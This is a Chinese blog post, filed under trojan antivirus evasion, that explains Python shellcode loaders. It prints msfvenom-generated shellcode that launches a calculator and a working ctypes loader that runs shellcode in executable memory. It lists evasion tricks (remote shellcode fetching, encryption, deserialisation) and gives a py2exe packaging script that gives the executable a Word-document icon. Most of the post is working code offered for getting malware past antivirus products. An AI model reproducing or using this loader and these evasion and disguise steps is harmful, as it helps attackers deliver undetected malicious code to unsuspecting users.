---
title: Python ShellCode加载器简述   --花无名
layout: mypost
categories: [木马免杀]
---    

## 什么是ShellCode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。

简单说，shellcode即为一段用于计算机执行命令的指令代码。

如使用msf生成一段调用机器计算器的指令

`msfvenom -p windows/x64/exec CMD=calc.exe -f python`

shellcode如下

```
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
buf += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
buf += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
buf += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
buf += b"\x78\x65\x00"
```

## 什么是shellcode加载器

shellcode加载器可理解为专门用于加载计算机指令代码（shellcode）的一段程序或工具

## 常用的python shellcode加载器

```
#!/usr/bin/python3
import ctypes

#shellcode 放这个位置
c = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31"

shellcode = bytearray(c)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

## 免杀方法

1.分离免杀：将shellcode放到公网，通过下载方式加载shellcode，或同时放到本地，执行shellcode加载器时可以同时加载shellcode。

2.shellcode加密：实验比较发现，python加载器将shellcode做一下简单加密解密处理后，可过部分杀软

3.反序列化：可将shellcode加载器的代码做序列化处理后，反序列化加载，实验发现可过大部分杀软。

## python可执行文件打包

pyinstaller

这个打包方式在个别的杀软会默认报毒，哪怕只是打包一个简单的输出语句

![image-20210926101728145](/assets/images/20210926/image-20210926101728145.png)

py2exe

可尝试使用这个打包方式，但是也有一个通病就是python的打包文件都比较大，大概在5m左右，不过，可以实现免杀效果好的话也是可以接受的。

打包代码如下：

```
# setup.py 用于py2exe打包
from distutils.core import setup
import py2exe
setup(
    options={
        'py2exe': {
            'optimize': 2, # 优化级别最高，
            'bundle_files': 1, # 将生成的调用文件打包进exe文件
            'compressed': 1, # 压缩
        },
    },
    windows=[{"script": "pyload.py", #需要打包的程序的文件路径，windows->GUI exe的脚本列表,console-> 控制台exe的脚本列表
              "icon_resources": [(1, "word.ico")]}], # 程序的图标的图片路径
    zipfile=None, # 不生成library.zip文件，则捆绑在可执行文件中
)
```

本文只是写一下python免杀的大致思路，病毒与反病毒是一个长期课程，更多的方法和思路要根据当前的网络环境和防护方式来实现。

注：本文参考小维师傅文章编写